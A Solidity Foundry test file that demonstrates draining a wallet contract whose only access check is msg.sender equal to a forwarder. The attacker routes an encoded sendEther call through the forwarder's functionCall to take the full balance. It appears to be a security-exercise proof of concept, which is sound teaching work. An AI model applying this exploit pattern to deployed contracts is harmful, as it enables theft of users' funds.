// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Forwarder, Wallet} from "../src/Forwarder.sol";

/**
 * @title Forwarder Attack Test
 * @notice Demonstrates exploitation of insufficient access control in proxy pattern
 *
 * @dev The vulnerability exists because:
 * - Wallet contract only checks msg.sender == forwarder
 * - But doesn't verify the transaction initiator
 *
 * Attack flow:
 * 1. Create ABI-encoded call to sendEther(attacker, 1 ether)
 * 2. Use Forwarder.functionCall() as proxy
 * 3. Pass msg.sender check (since call comes from Forwarder)
 * 4. Drain wallet funds to attacker
 *
 */
contract ForwarderTest is Test {
    Wallet public walletContract;
    Forwarder public forwarderContract;
    address public attacker;
    uint256 public constant WALLET_BALANCE = 1 ether;

    function setUp() public {
        attacker = makeAddr("attacker");
        forwarderContract = new Forwarder();
        walletContract = new Wallet{value: WALLET_BALANCE}(address(forwarderContract));
    }

    function testExploit() public {
        bytes memory encodedCall = abi.encodeWithSignature("sendEther(address,uint256)", attacker, WALLET_BALANCE);

        vm.startPrank(attacker);
        forwarderContract.functionCall(address(walletContract), encodedCall);
        vm.stopPrank();

        assertEq(attacker.balance, 1 ether, "Attacker should get almost all ETH");
        assertEq(address(walletContract).balance, 0, "Wallet should be empty");
    }
}
